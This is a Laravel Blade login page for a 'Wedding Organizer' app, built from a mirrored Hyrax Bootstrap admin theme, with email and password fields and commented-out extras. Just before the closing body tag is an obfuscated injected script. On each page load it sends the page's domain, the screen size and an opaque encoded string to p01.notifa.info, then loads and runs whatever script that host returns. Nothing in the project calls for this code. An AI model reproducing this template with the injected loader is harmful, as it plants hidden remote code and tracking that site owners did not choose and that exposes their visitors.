
<!DOCTYPE html>
<html lang="en">


<!-- Mirrored from creativethemes.co.in/demo/studioux/hyrax-admin-bootstrap4/main/pages-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 Nov 2018 07:37:40 GMT -->
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="{{asset('/hyrax/assets/images/shop.jpg')}}">
    <title>Wedding Organizer</title>
    <!-- Bootstrap Core CSS -->
    <link href="{{asset('/hyrax/assets/vendors/bootstrap/css/bootstrap.min.css')}}" rel="stylesheet">
    <!-- page css -->
    <link href="{{asset('/hyrax/main/css/pages/login-register-lock.css')}}" rel="stylesheet">
    <!-- Custom CSS -->
    <link href="{{asset('/hyrax/main/css/master-stylesheet.css')}}" rel="stylesheet">
    
    <!-- You can change the theme colors from here -->
    <link href="{{asset('/hyrax/main/css/colors/default.css')}}" id="theme" rel="stylesheet">
    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
    <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
    <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
<![endif]-->
</head>

<body class="card-no-border">
    <!-- ============================================================== -->
    <!-- Preloader - style you can find in spinners.css -->
    <!-- ============================================================== -->
    <div class="preloader">
        <div class="loader">
      <div class="lds-roller">
      <div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>
        </div>
    </div>
    <!-- ============================================================== -->
    <!-- Main wrapper - style you can find in pages.scss -->
    <!-- ============================================================== -->
    <section id="wrapper">
        <div class="login-register" style="background-image:url(../hyrax/assets/images/background/akad.jpg);">
            <div class="login-box card">
                <div class="card-body">
                    <form class="form-horizontal form-material" method="POST" id="loginform" action="{{route('login')}}">
                        @csrf
                        <h3 class="box-title mb-20">Sign In</h3>
                        <div class="form-group ">
                            <div class="col-xs-12">
                                <input id="email" type="email" class="form-control{{ $errors->has('email') ? ' is-invalid' : '' }}" name="email" value="{{ old('email') }}" placeholder="Email" required autofocus>

                                @if ($errors->has('email'))
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $errors->first('email') }}</strong>
                                    </span>
                                @endif
                            </div>
                        </div>
                        <div class="form-group">
                            <div class="col-xs-12">
                                <input id="password" type="password" class="form-control{{ $errors->has('password') ? ' is-invalid' : '' }}" name="password" placeholder="Password" required>

                                @if ($errors->has('password'))
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $errors->first('password') }}</strong>
                                    </span>
                                @endif
                            </div>
                        </div>
                        <div class="form-group row">
                            <div class="col-md-12">
                                <!-- <div class="checkbox checkbox-info pull-left pt-0">
                                    <input class="filled-in chk-col-light-blue" type="checkbox" name="remember" id="remember" {{ old('remember') ? 'checked' : '' }}>

                                    <label class="form-check-label" for="checkbox-signup">
                                        {{ __('Remember Me') }}
                                    </label>
                                </div> -->

                                <!-- <a href="javascript:void(0)" id="to-recover" class="text-dark pull-right"><i class="fa fa-lock mr-5"></i> Forgot pwd?</a>
                                <a class="text-dark pull-right" href="{{ route('password.request') }}">
                                    {{ __('Forgot Your Password?') }}
                                </a> -->
                            </div>
                        </div>
                        <div class="form-group text-center">
                            <div class="col-xs-12 pb-20">
                                <button class="btn btn-block btn-lg btn-primary btn-rounded" type="submit">Log In</button>
                            </div>
                        </div>
                        <!-- <div class="row">
                            <div class="col-xs-12 col-sm-12 col-md-12 mt-10 text-center">
                                <div class="social">
                                    <a href="javascript:void(0)" class="btn  btn-facebook" data-toggle="tooltip" title="Login with Facebook"> <i aria-hidden="true" class="fa fa-facebook"></i> </a>
                                    <a href="javascript:void(0)" class="btn btn-googleplus" data-toggle="tooltip" title="Login with Google"> <i aria-hidden="true" class="fa fa-google-plus"></i> </a>
                                </div>
                            </div>
                        </div> -->
                        <!-- <div class="form-group mb-0">
                            <div class="col-sm-12 text-center">
                                Email Anda Belum Terdaftar ? <a href="{{ route('register') }}" class="text-info ml-5"><b>Daftar</b></a>
                            </div>
                        </div> -->
                    </form>
                    <!-- <form class="form-horizontal" id="recoverform" action="http://creativethemes.co.in/demo/studioux/hyrax-admin-bootstrap4/main/index.html">
                        <div class="form-group ">
                            <div class="col-xs-12">
                                <h3>Recover Password</h3>
                                <p class="text-muted">Enter your Email and instructions will be sent to you! </p>
                            </div>
                        </div>
                        <div class="form-group ">
                            <div class="col-xs-12">
                                <input class="form-control" type="text" required="" placeholder="Email"> </div>
                        </div>
                        <div class="form-group text-center mt-20">
                            <div class="col-xs-12">
                                <button class="btn btn-primary btn-lg btn-block text-uppercase waves-effect waves-light" type="submit">Reset</button>
                            </div>
                        </div>
                    </form> -->
                </div>
            </div>
        </div>
    </section>
    
    <!-- ============================================================== -->
    <!-- End Wrapper -->
    <!-- ============================================================== -->
    <!-- ============================================================== -->
    <!-- All Jquery -->
    <!-- ============================================================== -->
    <script src="{{asset('/hyrax/assets/vendors/jquery/jquery.min.js')}}"></script>
    <!-- Bootstrap tether Core JavaScript -->
    <script src="{{asset('/hyrax/assets/vendors/bootstrap/js/popper.min.js')}}"></script>
    <script src="{{asset('/hyrax/assets/vendors/bootstrap/js/bootstrap.min.js')}}"></script>
    <!--Custom JavaScript -->
    <script type="text/javascript">
        $(function() {
            $(".preloader").fadeOut();
        });
        $(function() {
            $('[data-toggle="tooltip"]').tooltip()
        });
        // ============================================================== 
        // Login and Recover Password 
        // ============================================================== 
        $('#to-recover').on("click", function() {
            $("#loginform").slideUp();
            $("#recoverform").fadeIn();
        });
    </script>
    
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582PbDUVNc7V%2bdJjhfuBGXJ88NA23E%2f2TBj8qiNipfUnitqVPsLj8vfU2Hq2J3o1VydBulVo%2fvQWLB%2fi53p%2bc70GXZpkRZWf3eOwXqTfz2B4spg3pxcZzGAWYuXLglCwD3qrM1DaHV0EiMCFVVUGJeNBFOfqjRnci7DfDpXfWFTRarmYwONPxPMSSVc8udqCK1HRf%2byhIKGDUSAUhNmMqSjLOC4bzXR6Z58sGYsoX9dd%2bjUo%2b3XWQgO2LQ8tYDrLkOuUOj4lVZuC%2fgyMQ1hX5zFTgOp4PLhSd2d4gpRd7AARFyhqkQpJHvbSbkz6LMar44xFyYU2EFgvr0yMTGsucEsFd8eHxXsgygMGS59KIFBdnkLU5cYV2X59dSifyG8OjUwB2WMVFy6lX9ZZipj3P9oVCQLFcDx%2fZAzxnosFlFyPLznMaaiWtVc4qSBsbyN0Gx2zxxQ8T2eT0kkXaEuc%2fkXuTwnMGCjTqN7%2fSt3pcXakgY49dMSET5vvGNhormuth%2btZ46Hi1AAuJ6yuAwk5%2fdAh7dkd%2fNmjEp2doFVy2Phl0KJyuKnzURfCQ%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


<!-- Mirrored from creativethemes.co.in/demo/studioux/hyrax-admin-bootstrap4/main/pages-login.html by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 25 Nov 2018 07:37:41 GMT -->
</html>

<!-- <div class="container">
    <div class="row justify-content-center">
        <div class="col-md-8">
            <div class="card">
                <div class="card-header">{{ __('Login') }}</div>

                <div class="card-body">
                    <form method="POST" action="{{ route('login') }}">
                        @csrf

                        <div class="form-group row">
                            <label for="email" class="col-sm-4 col-form-label text-md-right">{{ __('E-Mail Address') }}</label>

                            <div class="col-md-6">
                                <input id="email" type="email" class="form-control{{ $errors->has('email') ? ' is-invalid' : '' }}" name="email" value="{{ old('email') }}" required autofocus>

                                @if ($errors->has('email'))
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $errors->first('email') }}</strong>
                                    </span>
                                @endif
                            </div>
                        </div>

                        <div class="form-group row">
                            <label for="password" class="col-md-4 col-form-label text-md-right">{{ __('Password') }}</label>

                            <div class="col-md-6">
                                <input id="password" type="password" class="form-control{{ $errors->has('password') ? ' is-invalid' : '' }}" name="password" required>

                                @if ($errors->has('password'))
                                    <span class="invalid-feedback" role="alert">
                                        <strong>{{ $errors->first('password') }}</strong>
                                    </span>
                                @endif
                            </div>
                        </div>

                        <div class="form-group row">
                            <div class="col-md-6 offset-md-4">
                                <div class="form-check">
                                    <input class="form-check-input" type="checkbox" name="remember" id="remember" {{ old('remember') ? 'checked' : '' }}>

                                    <label class="form-check-label" for="remember">
                                        {{ __('Remember Me') }}
                                    </label>
                                </div>
                            </div>
                        </div>

                        <div class="form-group row mb-0">
                            <div class="col-md-8 offset-md-4">
                                <button type="submit" class="btn btn-primary">
                                    {{ __('Login') }}
                                </button>

                                @if (Route::has('password.request'))
                                    <a class="btn btn-link" href="{{ route('password.request') }}">
                                        {{ __('Forgot Your Password?') }}
                                    </a>
                                @endif
                            </div>
                        </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div> -->
